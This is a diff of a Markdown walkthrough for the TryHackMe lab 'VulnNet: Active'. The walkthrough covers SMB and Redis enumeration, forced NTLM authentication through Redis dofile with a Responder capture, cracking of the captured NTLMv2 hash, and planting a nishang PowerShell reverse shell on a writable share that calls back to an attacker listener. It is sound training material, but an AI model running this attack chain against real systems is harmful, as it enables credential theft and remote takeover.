@@ -3,7 +3,7 @@
 <em>VulnNet Entertainment just moved their entire infrastructure... Check this out...</em><br>
 <img width="80px" src="https://github.com/user-attachments/assets/183b30b9-5b5a-425b-83ba-d289f3914547"><br>
 Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/vulnnetactive">here </a>.<br>
-<img width="1200px" src=""></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/0a1d082c-2699-4840-bd3b-8329402384a0"></p>
 
 <br>
 <h2>Task 1 . VulnNet: Active</h2>
@@ -41,7 +41,7 @@ Icon made by <a href="https://www.freepik.com/">Freepik</a> from <a href="http:/
 - <code>49796</code> &nbsp; : &nbsp; Microsoft Windows RPC</p>
 
 ```bash
-:~/VulnNetActive# nmap -sT xx.xxx.xx.xx
+:~/VulnNetActive# nmap -sT xx.xxx.x.xxx
 ...
 PORT    STATE SERVICE
 53/tcp  open  domain
@@ -52,7 +52,7 @@ PORT    STATE SERVICE
 ```
 
 ```bash
-:~/VulnNetActive# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
+:~/VulnNetActive# nmap -sC -sV -Pn -p- -T4 xx.xxx.x.xxx
 ...
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain?
@@ -182,7 +182,7 @@ do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 
 ```bash
 :~/VulnNetActive# crackmapexec smb vulnnet.thm
-SMB         xx.xxx.xx.xx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
 ```
 
 <h2>rpcdump</h2>
@@ -195,17 +195,62 @@ SMB         xx.xxx.xx.xx    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763
 :~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | grep Print
 ```
 
-<img width="1092" height="153" alt="image" src="https://github.com/user-attachments/assets/0000e99c-8695-430d-8749-512b6cc1d2d0" />
-
-<br>
-<br>
-
 ```bash
 :~/VulnNetActive# python3.9 rpcdump.py @vulnnet.thm | egrep 'MS-RPRN|MS-PAR'
 Protocol: [MS-RPRN]: Print System Remote Protocol 
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
 ```
 
+<img width="1092" height="153" alt="image" src="https://github.com/user-attachments/assets/0000e99c-8695-430d-8749-512b6cc1d2d0" />
+
+<br>
+<br>
+<br>
+<h2>nxc smb</h2>
+
+```bash
+:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p 'xx.xxx.x.xxx'
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:***************
+```
+
+```bash
+:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p '***************' --continue-on-success
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:***************
+```
+
+```bash
+:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p 'xx.xxx.x.xxx' --shares
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:*************** 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Enumerated shares
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Share           Permissions     Remark
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  -----           -----------     ------
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  C$                              Default share
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE      
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
+```
+
+
+```bash
+:~/VulnNetActive# nxc smb xx.xxx.x.xxx -u 'enterprise-security' -p '***************' --users
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:***************
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Administrator                 2021-02-24 00:49:00 0       Built-in account for administering the computer/domain 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  krbtgt                        2021-02-23 09:32:07 0       Key Distribution Center Service Account 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  enterprise-security           2021-02-23 23:01:37 0       TryHackMe 
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  jack-goldenhand               2021-02-23 21:54:57 0        
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  tony-skid                     2021-02-23 21:56:53 0        
+SMB         xx.xxx.x.xxx    445    VULNNET-BC3TCK1  [*] Enumerated 6 local users: VULNNET
+```
+
+<br>
 <h2>Redis</h2>
 
 ```bash
@@ -248,14 +293,12 @@ vulnnet.thm:6379> CONFIG GET pidfile
 vulnnet.thm:6379> CONFIG GET dbfilename
 1) "dbfilename"
 2) "dump.rdb"
-3) ```
 ```
 
 ```bash
 vulnnet.thm:6379> CONFIG GET logfile
 1) "logfile"
 2) ""
-3) ```
 ```
 
 <p>
@@ -266,7 +309,6 @@ vulnnet.thm:6379> CONFIG GET logfile
 vulnnet.thm:6379> CONFIG GET dir
 1) "dir"
 2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
-3) ```
 ```
 
 ```bash
@@ -281,22 +323,7 @@ vulnnet.thm:6379> CONFIG GET *
 ...
 ```
 
-```bash
-vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
-(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
-```
-
-<img width="1086" height="106" alt="image" src="https://github.com/user-attachments/assets/30437ddd-c49c-425c-8407-688916217194" />
-
-<br>
-<br>
-
-<p>1.1.  What is the user flag? (Desktop\user.txt)<br>
-<code>THM{3eb176aee96432d5b100bc93580b291e}</code></p>
-
-<br>
-
-<h2>Reponder</h2>
+<h4>Reponder</h4>
 
 ```bash
 :~/VulnNetActive# responder -I ens5
@@ -310,71 +337,80 @@ vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\
 [+] Listening for events...
 ```
 
-<h2>Redis</h2>
+<br>
 
 ```bash
-vulnnet.thm:6379> eval "dofile('//xx.xxx.xx.xx/share')" 0
-(error) ERR Error running script (call to f_32380ab635d6cb342773862d8d86a17e07226ad8): @user_script:1: cannot open //xx.xxx.xx.xx/share: Permission denied 
+vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+(error) ERR Error running script (call to f_...): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
 ```
 
-<h2>Responder</h2>
+<img width="1086" height="106" alt="image" src="https://github.com/user-attachments/assets/30437ddd-c49c-425c-8407-688916217194" />
+
+<br>
+<br>
 
 ```bash
+vulnnet.thm:6379> eval "dofile('\\\\xx.xxx.x.xxx\\\\test')" 0
+(error) ERR Error running script (call to f_...): @user_script:1: cannot open \xx.xxx.x.xxx\test: No such file or directory
+```
+
+<br>
+<br>
+
+```bash
+vulnnet.thm:6379> CONFIG SET dir \\xx.xxx.x.xxx\share
+(error) ERR Changing directory: Permission denied
+```
+
+<h4>Reponder</h4>
+
+```bash
+[SMB] NTLMv2-SSP Client   : ::ffff:xx.xxx.x.xxx
 [SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
-[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:010100000000000000F81DAD5815DC011C9C79CBCAB219E0000000000200080034004E005600510001001E00570049004E002D0047003500490047004A003200470034004C004E00330004003400570049004E002D0047003500490047004A003200470034004C004E0033002E0034004E00560051002E004C004F00430041004C000300140034004E00560051002E004C004F00430041004C000500140034004E00560051002E004C004F00430041004C000700080000F81DAD5815DC010600040002000000080030003000000000000000000000000030000046B2BA4B3F219184389733CCEF7D9876E0997C0921B6D126A0BEF7D02109F9290A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300031002E00370033002E00350033000000000000000000
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:6892ced64ce981aa:76D09B9530D10553EF6ED...0390058004B0001001E00570049004E002D00360041005000370033004A0034005A0047004...0030002E003200300031002E0039002E003100330038000000000000000000
 ```
 
-<img width="1164" height="196" alt="image" src="https://github.com/user-attachments/assets/905024d2-c94d-4bda-b2a5-cb536979e4a6" />
 
-<h3>Hash</h3>
+<h2>Hash Cracking</h2>
 
 ```bash
-:~/VulnNetActive# cat hash
-enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:010100000000000000F81DAD5815DC011C9C79CBCAB219E0000000000200080034004E005600510001001E00570049004E002D0047003500490047004A003200470034004C004E00330004003400570049004E002D0047003500490047004A003200470034004C004E0033002E0034004E00560051002E004C004F00430041004C000300140034004E00560051002E004C004F00430041004C000500140034004E00560051002E004C004F00430041004C000700080000F81DAD5815DC010600040002000000080030003000000000000000000000000030000046B2BA4B3F219184389733CCEF7D9876E0997C0921B6D126A0BEF7D02109F9290A001000000000000000000000000000000000000900220063006900660073002F00310030002E003200300031002E00370033002E00350033000000000000000000
+:~/VulnNetActive# nano hash
 ```
-
-<h2>John the Ripper</h2>
-<p>
-
--  enterprise-security : sand_0873959498</p>
 
 ```bash
-:~/VulnNetActive# john hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
+:~/VulnNetActive# john --format=netntlmv2 hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+**************  (enterprise-security)
+1g 0:00:00:06 DONE (2025-09-07 xx:xx) 0.1536g/s 616602p/s 616602c/s 616602C/s *****!****..*******
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
 ```
 
-<img width="1166" height="296" alt="image" src="https://github.com/user-attachments/assets/2673e1bc-b32f-45e0-8457-bb74486177a0" />
-
-<h2>smbclient</h2>
-<p>
-
-- Enterprise-Share</p>
+<h2>Invoke-PowerShellTcp.ps1</h2>
 
 ```bash
-:~/VulnNetActive# smbclient -L vulnnet.thm -U enterprise-security
+:~/VulnNetActive# smbclient \\\\xx.xxx.x.xxx\\Enterprise-Share -U enterprise-security@vulnnet.local
+Password for [enterprise-security@vulnnet.local]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Sep  7 xx:xx:xx 2025
+  ..                                  D        0  Mon Sep  7 xx:xx:xx 2025
+  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 00:33:18 2021
+
+		9558271 blocks of size 4096. 4994656 blocks available
 ```
-
-<img width="1173" height="265" alt="image" src="https://github.com/user-attachments/assets/06e388b5-f725-4fe4-bc58-3c7289e57860" />
-
-<br>
-<br>
-
-```bash
-:~/VulnNetActive# smbclient \\\\vulnnet.thm\\Enterprise-Share -U enterprise-security
-```
-
-<img width="1166" height="237" alt="image" src="https://github.com/user-attachments/assets/f86c9743-4732-4f0f-87f4-55adfbd85e48" />
-
-<h2>Reverse Shell</h2>
-
 
 <p>
 
 - download <code>https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1</code><br>
-- add <code>Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx</code> to <code>Invoke-PowerShellTcp.ps1</code></p>
+- add <code>Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.x.xxx -Port xxxx</code> to <code>Invoke-PowerShellTcp.ps1</code></p>
 
 
 ```bash
-:~/VulnNetActive# curl https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1 -o Invoke-PowershellTcp.ps1
+:~/VulnNetActive# wget https://github.com/samratashok/nishang/tree/master/Shells/Invoke-PowerShellTcp.ps1 -o Invoke-PowershellTcp.ps1
 ```
 
 ```bash
@@ -393,24 +429,115 @@ enterprise-security::VULNNET:74f30e663d27c058:CC0B81EE8B9201120686ED159A4183B8:0
     }
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress xx.xxxx.xx.xx -Port xxxx
+Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.x.xxx -Port xxxx
+```
+
+
+```bash
+:~/VulnNetActive# mv Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1
 ```
 
 ```bash
-smb: \> put Invoke-PowerShellTcp.ps1
+smb: \> put PurgeIrrelevantData_1826.ps1
+putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (4300.4 kb/s) (average 4300.8 kb/s)
+smb: \> 
+```
 
+<h2></h2>
+
+```bash
+:~/VulnNetActive# nc -nlvp 1234
+Listening on 0.0.0.0 1234
+...
+Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\enterprise-security\Downloads>
+```
+
+<img width="1290" height="628" alt="image" src="https://github.com/user-attachments/assets/fe62514c-b69d-4470-a475-be13f27f336f" />
+
+<img width="1298" height="617" alt="image" src="https://github.com/user-attachments/assets/9b0c793d-5f28-41f1-b4e4-52879ab64313" />
+
+
+<br>
+<p>1.1.  What is the user flag? (Desktop\user.txt)<br>
+<code>THM{*****************************}</code></p>
+<br>
+
+
+```bash
+PS C:\Users\enterprise-security\Downloads> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
 
 
+
+
+<img width="1293" height="177" alt="image" src="https://github.com/user-attachments/assets/5c449796-39fd-43bd-a50e-5d89d5fcc915" />
+
+
+<img width="1265" height="248" alt="image" src="https://github.com/user-attachments/assets/c26c4acd-6ac6-4f82-8652-686ecfab3625" />
+
+<br>
+<br>
+<p>Walkthrough will be completed ... I invest a lot of time writing it and learn a lot.</p>
+
+
+<br>
 <p>1.2. What is the system flag? (Desktop\system.txt)<br>
-<code>________</code></p>
+<code>THM{*********************************}</code>
+
+<br>
+<br>
+<h2 align="center">Completed</h2>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/f48ec7e1-eebd-4617-9eb6-d30461f0204b"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/b111cb52-637a-4f54-bc3f-4bf1ec5665f9"></p>
+
+<h2 align="center">My TryHackMe Journey</h2>
 
 
+<div align="center"><h6>
 
+| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
+|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
+| 2025, Sep 7       |Medium 🚩 - <code><strong>VulnNet: Active</strong></code>| 489| 114ᵗʰ | 5ᵗʰ   |    542ⁿᵈ    |     9ᵗʰ    | 124,746  |  950      |    73     |
+| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489|     114ᵗʰ |     5ᵗʰ      |    535ᵗʰ   |     9ᵗʰ    | 124,716  |  949      |    73     |
+| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
+| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
+| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
+| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
+| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
+| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
+| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
+| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
+| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
+| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
+| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
+| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |
 
+</h6></div><br>
 
+<br>
 
+<p align="center">Global All Time:   114ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/65102bbc-fd6c-40d2-aac3-ff660919f235"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/096ee236-d33c-4c4a-8438-773100abcf5c"><br><br>
+                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c4d7797d-f623-423d-abcc-aaa38c17a734"><br>
+                  Global monthly:    542ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/7df95781-b9f3-483a-9dc5-9b4f80b5dd0d"><br>
+                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/62fdb1ba-7d15-4ab6-ac5f-192bdb27d5b0"><br>
 
-
+<h2 align="center">Thanks for coming!</h2>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
 
